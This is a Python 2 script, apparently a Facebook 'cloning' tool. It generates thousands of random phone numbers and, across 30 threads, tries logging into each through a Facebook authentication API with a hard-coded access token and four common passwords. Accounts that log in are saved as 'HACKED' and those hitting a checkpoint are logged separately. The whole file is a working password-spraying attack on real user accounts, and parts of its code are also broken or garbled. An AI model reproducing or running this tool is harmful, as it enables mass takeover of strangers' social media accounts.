# Ustad# uzair# Thuglife# uzair# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(20000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/12.0 (Android; Opera Mini/52.2.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully thanku somi'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mW\033[1;96m A\033[1;92m I\033[1;95m T\x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"


def logo():
	os.system('echo -e "\n╔══╗╔═╗╔═╗╔══╗╔═╗╔═╗
"\n╚╗╗║║║║║╔╝╚╗╔╝║║║║╬║
"\n╔╩╝║║║║║╚╗─║║─║║║║╗╣
"\n╚══╝╚═╝╚═╝─╚╝─╚═╝╚╩╝lolcat')


##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    logo()
    
    jalan('\x1b[1;93m〖\x1b[1;92m1\x1b[1;96m〗7 Digits Cloning \033[1;0m     ') 
    jalan('\x1b[1;93m〖\x1b[1;92m1\x1b[1;96m〗STOP CLONING \033[1;0m     ')
    
    pilih_uzair()
   
def pilih_uzair():    
    uzair = raw_input("\n\033[1;96m•••> \033[1;93m")
    if uzair =="":
        print "\x1b[1;97mSORRY WRONG "
        pilih_uzair()
        uzair()
    elif uzair =="1":
    	os.system("clear")
        logo()
        try:
            c = raw_input("\033[1;93m    951-331-953-954-955-956-520-521-522-523'\n>>\033[1;96m")
            k="+628"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            Somi()
            
    elif uzair == '2':
    	six()
    elif uzair == '0':
    	tik()
        exb()    
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47* '\033[1;96m▬'
    xxx = str(len(id))
    jalan ('\033[1;97m(\033[1;91m✓\033[1;97m) TOTAL IDS NUMBER : '+xxx)
    jalan ('\033[1;97m(\033[1;91m✓\033[1;97m) CODE YOU CHOOSE UFONE : '+c)
    jalan ("\033[1;97m(\033[1;91m✓\033[1;97m) PLEASE WAIT, PROCESS IS START ..")
    jalan ("\033[1;97m(\033[1;91m!\033[1;97m) To Stop This Process Press Ctrl Then z")
    print 47* '\033[1;96m▬'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = 'Sayang'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m(HAC\x1b[1;92mKED)\033[1;91m  ' + k + c + user + '\033[1;97m  ➙ \033[1;92m ' + pass1                                       
                okb = open('save/successful.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;96m(Check\033[1;94mpoint)\033[1;93m ' + k + c + user + ' \033[1;97m ➙\033[1;92m  ' + pass1
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = 'bismillah'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m(HAC\x1b[1;92mKED)\033[1;91m  ' + k + c + user +  '  \033[1;97m➙  \033[1;92m' + pass2
                        okb = open('save/successful.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;96m(Check\033[1;94mpoint)\033[1;93m ' + k + c + user + ' \033[1;97m ➙\033[1;92m  ' + pass2
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3= 'anjing'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;94m(HAC\x1b[1;92mKED)\033[1;91m  ' + k + c + user + '\033[1;97m  ➙\033[1;92m   ' + pass3
                                okb = open('save/successful.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else: 
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;96m(Check\033[1;94mpoint)\033[1;93m ' + k + c + user + '  \033[1;97m➙  \033[1;92m' + pass3 
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4= 'bangsat'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;94m(HAC\x1b[1;92mKED)\033[1;91m  ' + k + c + user + ' \033[1;97m ➙ \033[1;92m ' + pass4 
                                        okb = open('save/successful.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;96m(Check\033[1;94mpoint) \033[1;93m' + k + c + user + '  \033[1;97m➙  \033[1;92m' + pass4
                                            cps = open('save/checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            

                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;93mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;92mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    print ''
    print """
    """
    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
          

          
if __name__ == '__main__':
    login()
